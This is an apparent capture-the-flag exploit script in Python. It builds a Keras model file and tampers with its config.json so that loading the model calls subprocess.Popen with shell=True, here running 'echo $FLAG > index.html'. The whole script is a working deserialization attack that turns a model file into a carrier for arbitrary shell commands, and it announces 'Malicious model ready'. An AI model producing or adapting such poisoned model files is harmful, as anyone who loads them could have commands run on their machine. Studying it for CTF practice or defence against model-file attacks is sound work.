import zipfile
import json
from keras.models import Sequential
from keras.layers import Dense
import numpy as np
import os

model_name="model.keras"

x_train = np.random.rand(100, 28*28)  
y_train = np.random.rand(100) 

model = Sequential([Dense(1, activation='linear', input_dim=28*28)])

model.compile(optimizer='adam', loss='mse')
model.fit(x_train, y_train, epochs=5)
model.save(model_name)

with zipfile.ZipFile(model_name,"r") as f:
    config=json.loads(f.read("config.json").decode())
    
config["config"]["layers"][0]["module"]="keras.models"
config["config"]["layers"][0]["class_name"]="Model"
config["config"]["layers"][0]["config"]={
    "name":"mvlttt",
    "layers":[
        {
            "name":"mvlttt",
            "class_name":"function",
            "config":"Popen",
            "module": "subprocess",
            "inbound_nodes": [
          {
            "args": [
              ["echo $FLAG > index.html"]
            ],
            "kwargs": {"shell": True}
          }
        ]        }],
            "input_layers":[["mvlttt", 0, 0]],
            "output_layers":[["mvlttt", 0, 0]]
        }

with zipfile.ZipFile(model_name, 'r') as zip_read:
    with zipfile.ZipFile(f"tmp.{model_name}", 'w') as zip_write:
        for item in zip_read.infolist():
            if item.filename != "config.json":
                zip_write.writestr(item, zip_read.read(item.filename))

os.remove(model_name)
os.rename(f"tmp.{model_name}",model_name)


with zipfile.ZipFile(model_name,"a") as zf:
        zf.writestr("config.json",json.dumps(config))

print("[+] Malicious model ready")